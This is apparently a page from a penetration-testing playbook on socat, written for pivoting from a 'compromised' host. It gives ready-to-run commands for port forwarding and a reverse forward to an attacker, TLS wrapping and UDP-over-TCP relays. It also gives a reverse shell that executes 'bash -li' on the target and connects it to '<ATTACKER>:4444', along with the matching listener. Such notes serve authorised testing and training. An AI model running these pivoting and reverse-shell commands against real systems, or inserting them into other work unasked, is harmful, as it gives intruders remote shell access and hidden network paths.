# 08.04 socat

> Bidirectional data relay — TCP/UDP/SSL/Unix sockets/files/pipes/files all chainable in one tool.

## Overview

socat is netcat on steroids — full bidirectional protocol relay between any two endpoint types. Use for: port forwarding from compromised Windows host (no SSH), TLS-wrapping a plain protocol, tunneling UDP-only services over TCP, reverse shells with TTY upgrade. Both Linux and Windows.

## Steps

- **Step 1** - Install or transfer.
- **Step 2** - Build the relay spec — two endpoints separated by space.

## Commands

### Install

```bash
sudo apt install -y socat
# Windows binary:
# https://github.com/3proxy/3proxy/releases or sysprogs binaries
```

### Port forward — relay local 8443 to remote target

```bash
socat TCP-LISTEN:8443,fork,reuseaddr TCP:<INTERNAL>:443
```

### Reverse port forward — relay incoming to attacker

```bash
# On pivot — open local 8080, forward to attacker:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<ATTACKER>:80
```

### TLS termination

```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=local
# Listen TLS, forward plain
socat OPENSSL-LISTEN:8443,cert=cert.pem,key=key.pem,verify=0 TCP:127.0.0.1:80
```

### Reverse shell upgrade (TTY)

```bash
# After catching basic reverse shell via 'nc -lvnp 4444'
# Use socat for a proper TTY (run on target):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER>:4444
# Catch on attacker with socat for full TTY:
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:4444
```

### UDP over TCP relay

```bash
socat TCP-LISTEN:1234,fork UDP:<INTERNAL>:53
```
